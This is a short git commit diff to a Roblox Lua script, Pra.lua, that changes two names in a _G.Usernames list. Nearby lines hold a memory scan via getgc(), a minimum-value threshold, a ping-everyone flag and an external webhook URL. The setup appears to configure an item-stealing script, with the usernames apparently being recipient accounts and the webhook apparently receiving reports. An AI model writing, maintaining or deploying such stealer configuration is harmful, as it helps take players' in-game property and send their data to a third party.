590aee890d80d0fe09e0325c801d9f2e76c09bef
ShxDrag <bns19126@gmail.com>
2026-03-16 21:32:55 +0900

    Update Pra.lua

--- Pra.lua
+++ Pra.lua
@@ -63,7 +63,7 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"SubZerozyq", "Robloxpurpleblue1111", "Robloxorange1111"}
+_G.Usernames = {"SubZerozyq", "Robloxblueblue1111", "Robloxlight1111"}
 _G.min_value = 1
 _G.pingEveryone = "Yes"
 _G.webhook = "https://megamegamega.vercel.app/api/webhook"
